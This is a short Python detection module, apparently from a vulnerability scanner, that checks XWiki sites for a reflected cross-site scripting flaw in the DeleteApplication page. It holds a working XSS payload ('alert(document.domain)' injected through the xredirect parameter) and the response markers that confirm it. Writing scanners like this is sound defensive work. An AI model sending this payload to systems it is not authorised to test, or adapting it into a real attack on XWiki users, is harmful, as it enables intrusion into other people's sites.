...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki DeleteApplication - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xwiki', 'xss'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        for path in ("/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f'%3balert(document.domain)%2f%2f", "/xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f'%3balert(document.domain)%2f%2f"):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = (';;alert(document.domain)//"><input class="button secondary', 'onclick="location=',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='XWiki DeleteApplication - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False
